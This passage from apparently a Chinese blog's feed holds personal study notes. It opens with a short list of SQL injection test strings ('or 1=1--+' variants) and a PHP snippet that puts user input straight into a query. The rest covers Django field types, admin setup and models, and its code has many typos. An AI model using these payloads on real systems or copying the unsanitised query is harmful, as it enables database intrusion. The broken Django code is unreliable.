class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&#x27;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&#x27;)or 1=1--+</span><br><span class="line">&quot;)or 1=1--+</span><br><span class="line">))or 1=1--+</span><br></pre></td></tr></table></figure><p>一般代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h2 id="UNION操作符介绍"><a href="#UNION操作符介绍" class="headerlink" title="UNION操作符介绍"></a>UNION操作符介绍</h2><p>UNION操作符用于合并两个或多个SELECT语句的结果集。请注意，UNION内部的SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条SELECT语句中的列顺序必须相同。<br><strong>SQL UNION 语法</strong><br>SELECT column_name(s) FROM table_name1<br>UNION<br>SELECT column_name(s) FROM table_name2<br>另外，UNION结果集中列名总是等于UNION中的第一个SELECT语句中的列名。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Django字段类型</title>
      <link href="/48213.html"/>
      <url>/48213.html</url>
      
        <content type="html"><![CDATA[<h1 id="Django-field-types介绍"><a href="#Django-field-types介绍" class="headerlink" title="Django field types介绍"></a>Django field types介绍</h1><h2 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h2><h3 id="AutoField"><a href="#AutoField" class="headerlink" title="AutoField"></a>AutoField</h3><p>它是一个根据ID自增长的IntegerField字段。通常不必直接使用该字段。如果没在别的字段上指定主键，Django就会自动添加主键字段。</p><h3 id="BigIntegerField"><a href="#BigIntegerField" class="headerlink" title="BigIntegerField"></a>BigIntegerField</h3><p>64位整数，类似于<strong>IntegerField</strong>，范围从-9223372036854775808 到9223372036854775807。默认的form widget 是TextInput。</p><h3 id="BooleanField"><a href="#BooleanField" class="headerlink" title="BooleanField"></a>BooleanField</h3><p>一个布尔值(true&#x2F;false)字段。<br>默认的form widget是CheckboxInput。<br>如果要使用null作为空值，可使用<strong>NullBooleanField</strong>。</p><h3 id="CharField"><a href="#CharField" class="headerlink" title="CharField"></a>CharField</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class CharField(max_length=None[,**options])</span><br></pre></td></tr></table></figure><p>它是一个字符串字段，对小写字符和大写字符都适用。<br>CharField有一个必须传入的参数：max_length，字段的最大字符数。它作用于数据库层级和Django的数据验证层级。</p><h3 id="DateField"><a href="#DateField" class="headerlink" title="DateField"></a>DateField</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class DateField([auto_now=False,auto_now_add=False,**options])</span><br></pre></td></tr></table></figure><p>该字段利用Python的datetime.date实例来表示日期</p><ul><li>DateField.auto_now: 每一次保存对象时,Django都会自动将该字段的值设置为当前时间.一般用来表示”最后修改时间”.要注意使用的是当前日期,而非默认值,所以不能通过重写默认值的办法来改变保存时间.</li><li>DateField.auto_now_add: 在第一次创建对象时,Django都会自动将该字段的值设置为当前时间,一般用来表示对象创建时间.它使用的同样是当前日期,而非默认值.</li></ul><p>默认的form widget是TextInput。<br>Note:当auto_now或者auto_now_add设置为True时，字段会有editable&#x3D;True和blank&#x3D;True的设定。</p><h3 id="EmailField"><a href="#EmailField" class="headerlink" title="EmailField"></a>EmailField</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class EmailField([max_length=75, **options])</span><br></pre></td></tr></table></figure><p>它是带有email合法性检测的CharField<br>Note: 最大长度默认为75,并不能存储所有与RFC3696&#x2F;5321兼容的email地址,如果要存储所有,请设置max_length&#x3D;254,设置为75是历史遗留问题</p><h3 id="FileField"><a href="#FileField" class="headerlink" title="FileField"></a>FileField</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class FileField(upload_to=None[,max_length=100,**options])</span><br></pre></td></tr></table></figure><p>文件上传字段<br>Note: 该字段不支持primary_key和unique参数,否则会抛出TypeError异常<br>它有一个必须的参数:<br><strong>FileField.upload_to</strong><br>用于保存文件的本地文件系统,它根据<strong>MEDIA_ROOT</strong>设置确定该文件的url属性.<br>该路径可以包含时间格式串strftime(),可以在上传文件的时候替换成当时日期&#x2F;时间(这样就不会出现在上传文件把某个目录塞满的情况了)<br>该参数也可以是一个可调用项,比如是一个函数,可以调用函数获得包含文件名的上传路径,这个可调用项必须要接收两个参数</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Django学习笔记-07</title>
      <link href="/57874.html"/>
      <url>/57874.html</url>
      
        <content type="html"><![CDATA[<h1 id="Django-Admin-管理工具"><a href="#Django-Admin-管理工具" class="headerlink" title="Django Admin 管理工具"></a>Django Admin 管理工具</h1><p>Django自动管理工具是django.contrib的一部分。可以在项目的settings.py中的INSTALLED_APPS设置：</p><h3 id="settings-py-文件代码"><a href="#settings-py-文件代码" class="headerlink" title="settings.py 文件代码"></a>settings.py 文件代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">    <span class="string">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.contenttypes&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.sessions&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.messages&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.staticfiles&#x27;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="激活管理工具"><a href="#激活管理工具" class="headerlink" title="激活管理工具"></a>激活管理工具</h2><p>通常在生成项目时会在urls.py中自动设置好<br>配置项如下所示：</p><h3 id="urls-py-文件代码"><a href="#urls-py-文件代码" class="headerlink" title="urls.py 文件代码"></a>urls.py 文件代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># urls.py</span></span><br><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">url(<span class="string">r&#x27;amdin/&#x27;</span>, admin.site.urls),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="使用管理工具"><a href="#使用管理工具" class="headerlink" title="使用管理工具"></a>使用管理工具</h2><p>通过命令<strong>python manage.py createsuperuser</strong>来创建超级用户。<br>为了让admin界面管理某个数据模型，需要先注册该数据模型到admin。</p><h4 id="admin-py-文件代码"><a href="#admin-py-文件代码" class="headerlink" title="admin.py 文件代码"></a>admin.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> TestModel.models <span class="keyword">import</span> Test</span><br><span class="line"></span><br><span class="line">admin.site.register(Test)</span><br></pre></td></tr></table></figure><h2 id="复杂模型"><a href="#复杂模型" class="headerlink" title="复杂模型"></a>复杂模型</h2><p>管理页面的功能强大,完全有能力处理更加复杂的数据模型;在models.py中增加一个更复杂的数据模型\</p><h4 id="models-py-文件代码"><a href="#models-py-文件代码" class="headerlink" title="models.py 文件代码"></a>models.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Contact</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">200</span>)</span><br><span class="line">    age = models.IntegerField(default=<span class="number">0</span>)</span><br><span class="line">    emali = models.EmailField()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__unicode__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># 作用:美化打印出来的结果</span></span><br><span class="line">    <span class="keyword">return</span> self.name</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tag</span>(models.Model):</span><br><span class="line">    contact = models.ForeignKey(Contact, on_delete=models.CASCADE,)</span><br><span class="line">    name = models.CharField(max_length=<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__unicode__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> slef.name</span><br></pre></td></tr></table></figure><p>这里有两个表,Tag以Contact为外部键,一个Contact可以对应多个Tag.<br>IntegerField用于存储整数<br><strong>在admin.py中注册多个模型并显示</strong></p><h4 id="admin-py-文件代码-1"><a href="#admin-py-文件代码-1" class="headerlink" title="admin.py 文件代码"></a>admin.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> TestModel.models <span class="keyword">import</span> Test, Tag, Contact</span><br><span class="line"></span><br><span class="line">amdin.site.register([Test, Contact, Tag])</span><br></pre></td></tr></table></figure><h3 id="使用以下命令来创建表结构"><a href="#使用以下命令来创建表结构" class="headerlink" title="使用以下命令来创建表结构"></a>使用以下命令来创建表结构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python manage.py makemigrations Testmodel</span><br><span class="line">$ python manage.py migrate TestModel <span class="comment">#创建表结构</span></span><br></pre></td></tr></table></figure><h2 id="自定义表单"><a href="#自定义表单" class="headerlink" title="自定义表单"></a>自定义表单</h2><p>自定义管理页面: 在”add”页面只想显示name和email部分,修改admin.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib import admin</span><br><span class="line">from TestModel.models import Test, Contact, Tag</span><br><span class="line"></span><br><span class="line">class ContactAdmin(admin.ModelAdmin):</span><br><span class="line">fields = (&#x27;name&#x27;,&#x27;email&#x27;)</span><br><span class="line">    </span><br><span class="line"> admin.site.register(Contact,ContactAdmin)</span><br><span class="line"> admin.site.register([Test, Tag])</span><br></pre></td></tr></table></figure><p>以上代码定义了一个ContactAdmin类,用以说明管理页面的显示格式.<br>里面的fields属性定义了要显示的字段.<br>由于该类对应的是Contact数据模型,在注册时也需要将它们一起注册.</p><h3 id="输入分栏块-每个栏块也可以定义自己的格式"><a href="#输入分栏块-每个栏块也可以定义自己的格式" class="headerlink" title="输入分栏块,每个栏块也可以定义自己的格式"></a>输入分栏块,每个栏块也可以定义自己的格式</h3><h4 id="admin-py-文件代码-2"><a href="#admin-py-文件代码-2" class="headerlink" title="admin.py 文件代码"></a>admin.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> TestModel.models <span class="keyword">import</span> Test, Contact, Tag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContactAdmin</span>(amdin.ModelAdmin):</span><br><span class="line">fieldsets = (</span><br><span class="line">    [<span class="string">&#x27;Main&#x27;</span>,&#123;</span><br><span class="line">    <span class="string">&#x27;fields&#x27;</span>:(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;email&#x27;</span>),</span><br><span class="line">    &#125;],</span><br><span class="line">    [<span class="string">&#x27;Advance&#x27;</span>,&#123;</span><br><span class="line">    <span class="string">&#x27;fields&#x27;</span>:(<span class="string">&#x27;age&#x27;</span>,),</span><br><span class="line">    &#125;]</span><br><span class="line">   )</span><br><span class="line">admin.site.register(Contact, ContactAdmin)</span><br><span class="line">admin.site.register([Test, Tag])</span><br></pre></td></tr></table></figure><h2 id="内联-Inline-显示"><a href="#内联-Inline-显示" class="headerlink" title="内联(Inline)显示"></a>内联(Inline)显示</h2><p>上面的Contact是Tag的外部键,所以有外部参考的关系<br>在默认的页面显示中,将两者分离开来,无法体现出两者的从属关系,我们可以使用内联显示,让Tag附加在Contact的编辑页面显示.</p><h4 id="admin-py-文件代码-3"><a href="#admin-py-文件代码-3" class="headerlink" title="admin.py 文件代码"></a>admin.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> TestModel.models <span class="keyword">import</span> Test, Contact, Tag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TagInline</span>(admin.TabularInline):</span><br><span class="line">   <span class="comment"># TabularInline类用于在A页面上编辑B表的字段</span></span><br><span class="line">model = Tag</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContactAdmin</span>(admin.ModelAdmin):</span><br><span class="line">   inlines = [TagInline] <span class="comment"># Inline</span></span><br><span class="line">   fieldsets = (</span><br><span class="line">       [<span class="string">&#x27;Main&#x27;</span>,&#123;</span><br><span class="line">           <span class="string">&#x27;fields&#x27;</span>:(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;email&#x27;</span>),</span><br><span class="line">       &#125;],</span><br><span class="line">       [<span class="string">&#x27;Advence&#x27;</span>,&#123;</span><br><span class="line">           <span class="string">&#x27;classes&#x27;</span>:(<span class="string">&#x27;collapse&#x27;</span>,),</span><br><span class="line">           <span class="string">&#x27;fields&#x27;</span>:(<span class="string">&#x27;age&#x27;</span>,),</span><br><span class="line">       &#125;]</span><br><span class="line">   )</span><br><span class="line">admin.site.register(Contact, ContactAdmin)</span><br><span class="line">admin.site.register([Test])</span><br></pre></td></tr></table></figure><h2 id="列表页显示"><a href="#列表页显示" class="headerlink" title="列表页显示"></a>列表页显示</h2><p>自定义页面的显示,比如在列表中显示更多的栏目,子需要在ContactAdmin中增加list_display属性:</p><h4 id="admin-py-文件代码-4"><a href="#admin-py-文件代码-4" class="headerlink" title="admin.py 文件代码"></a>admin.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> TestModel.models <span class="keyword">import</span> Test, Contact, Tag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TagInline</span>(admin.TabularInline):</span><br><span class="line">    model = Tag</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContactAdmin</span>(admin.ModelAdmin):</span><br><span class="line">    list_display= (<span class="string">&quot;name&quot;</span>, <span class="string">&quot;age&quot;</span>, <span class="string">&quot;email&quot;</span>)</span><br><span class="line">    inlines = [TagInline]</span><br><span class="line">    fieldsets = (</span><br><span class="line">        [<span class="string">&#x27;Main&#x27;</span>,&#123;</span><br><span class="line">            <span class="string">&#x27;fields&#x27;</span>:(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;email&#x27;</span>),</span><br><span class="line">        &#125;],</span><br><span class="line">        [<span class="string">&#x27;Advance&#x27;</span>,&#123;</span><br><span class="line">            <span class="string">&#x27;classes&#x27;</span>:(<span class="string">&#x27;collapse&#x27;</span>,),</span><br><span class="line">            <span class="string">&#x27;fields&#x27;</span>:(<span class="string">&#x27;age&#x27;</span>,),</span><br><span class="line">        &#125;]</span><br><span class="line">    )</span><br><span class="line">admin.site.register(Contact, ContactAdmin)</span><br><span class="line">admin.site.register([Test])</span><br></pre></td></tr></table></figure><p>搜索功能在管理大量记录时非常有用,可以使用search_fields为该列表页增加搜索栏:</p><h4 id="amdin-py-文件代码"><a href="#amdin-py-文件代码" class="headerlink" title="amdin.py 文件代码"></a>amdin.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> TestModel.models <span class="keyword">import</span> Test, Contact, Tag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TagInline</span>(admin.TabularInline):</span><br><span class="line">    model = Tag</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContactAdmin</span>(admin.ModelAdmin):</span><br><span class="line">    list_display = (<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    search_fields = (<span class="string">&#x27;name&#x27;</span>,)</span><br><span class="line">    inlines = [TagInline]</span><br><span class="line">    fieldsets = (</span><br><span class="line">        [<span class="string">&#x27;Main&#x27;</span>:&#123;</span><br><span class="line">            <span class="string">&#x27;fields&#x27;</span>:(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;email&#x27;</span>),</span><br><span class="line">        &#125;],</span><br><span class="line">        [<span class="string">&#x27;Advance&#x27;</span>:&#123;</span><br><span class="line">            <span class="string">&#x27;classes&#x27;</span>:(<span class="string">&#x27;collapse&#x27;</span>,),</span><br><span class="line">            <span class="string">&#x27;fields&#x27;</span>:(<span class="string">&#x27;age&#x27;</span>,),</span><br><span class="line">        &#125;]</span><br><span class="line">    )</span><br><span class="line">admin.site.register(Contact, ContactAdmin)</span><br><span class="line">admin.site.register([Test])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django学习笔记-06</title>
      <link href="/8915.html"/>
      <url>/8915.html</url>
      
        <content type="html"><![CDATA[<h1 id="Django-模型"><a href="#Django-模型" class="headerlink" title="Django 模型"></a>Django 模型</h1><h2 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h2><p>创建MySQL数据库（ORM无法操作到数据库级别，只能操作到数据表）语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database test default charset=utf8;</span><br></pre></td></tr></table></figure><h4 id="settings-py文件中DATABASES配置项："><a href="#settings-py文件中DATABASES配置项：" class="headerlink" title="settings.py文件中DATABASES配置项："></a>settings.py文件中DATABASES配置项：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line"><span class="string">&#x27;default&#x27;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,  <span class="comment">#数据库引擎</span></span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,                <span class="comment">#数据库名称</span></span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,             <span class="comment">#数据库地址</span></span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="string">&#x27;3306&#x27;</span>,                <span class="comment">#数据库端口</span></span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,                <span class="comment">#数据库用户名</span></span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,            <span class="comment">#数据库密码</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h4 id="使用pymysql模块连接mysql数据库："><a href="#使用pymysql模块连接mysql数据库：" class="headerlink" title="使用pymysql模块连接mysql数据库："></a>使用pymysql模块连接mysql数据库：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在与settings.py同级下的__init__.py中引入模块和进行配置</span></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure><h2 id="定义模型"><a href="#定义模型" class="headerlink" title="定义模型"></a>定义模型</h2><h3 id="创建APP"><a href="#创建APP" class="headerlink" title="创建APP"></a>创建APP</h3><p>Django规定，如果要使用模型，必须创建一个app，使用以下命令创建一个TestModel的app：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django-admin startapp TestModel</span><br></pre></td></tr></table></figure><h4 id="修改TestModel-x2F-models-py文件"><a href="#修改TestModel-x2F-models-py文件" class="headerlink" title="修改TestModel&#x2F;models.py文件"></a>修改TestModel&#x2F;models.py文件</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#models.py</span></span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>(models.Model):</span><br><span class="line">name = models.CharField(max_length=<span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>以上的类名代表了数据库表名，且继承了models.Model，类里面的字段代表数据库中的字段（name），数据类型则由CharField（相当于varchar）、Datefield（相当于datetime），max_length参数限定长度</p><h4 id="接下来需要在settings-py中的INSTALLED-APP中添加APP名称（TestModel）"><a href="#接下来需要在settings-py中的INSTALLED-APP中添加APP名称（TestModel）" class="headerlink" title="接下来需要在settings.py中的INSTALLED_APP中添加APP名称（TestModel）"></a>接下来需要在settings.py中的INSTALLED_APP中添加APP名称（TestModel）</h4><h4 id="在命令行中运行以下命令："><a href="#在命令行中运行以下命令：" class="headerlink" title="在命令行中运行以下命令："></a>在命令行中运行以下命令：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$python3 manage.py migrate  #创建表结构</span><br><span class="line">$python3 manage.py makemigrations  #迁移</span><br></pre></td></tr></table></figure><p>表名组成结构为：应用名_类名（如：TestModel_test）<br><strong>注意：</strong>尽管我们没有在models给表设置主键，但是Django会自动添加一个id作为主键。</p><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><h4 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views,testdb</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">path(<span class="string">&#x27;testdb/&#x27;</span>, testdb.testdb),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="添加数据（testdb-py）"><a href="#添加数据（testdb-py）" class="headerlink" title="添加数据（testdb.py）"></a>添加数据（testdb.py）</h4><p>添加数据需要先创建对象，然后再执行save函数，相当于SQL中的INSERT：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> TestModel.models <span class="keyword">import</span> Test</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">test1 = Test(name = <span class="string">&#x27;Dokey&#x27;</span>)</span><br><span class="line">    test1.save()</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&quot;&lt;p&gt;数据添加成功！&lt;/p&gt;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="获取数据（testdb-py）"><a href="#获取数据（testdb-py）" class="headerlink" title="获取数据（testdb.py）"></a>获取数据（testdb.py）</h4><p>Django提供了多种方式来获取数据库的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> TestModel.models <span class="keyword">import</span> Test</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testdb</span>(<span class="params">request</span>):</span><br><span class="line">   <span class="comment"># 初始化</span></span><br><span class="line">   response = <span class="string">&quot;&quot;</span></span><br><span class="line">   response1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment"># 通过objects这个模型管理器的all()获得所有数据行，相当于SQL中的SELECT * FROM </span></span><br><span class="line">   <span class="built_in">list</span> = Test.objects.<span class="built_in">all</span>()</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># filter相当于SQL中的WHERE，可设置条件过滤结果</span></span><br><span class="line">   response2 = Test.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 获取单个对象</span></span><br><span class="line">   response3 = Test.objects.get(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 限制返回的数据 相当于SQL中的 OFFSET 0 LIMIT 2;</span></span><br><span class="line">   Test.objects.order_by(<span class="string">&#x27;name&#x27;</span>)[<span 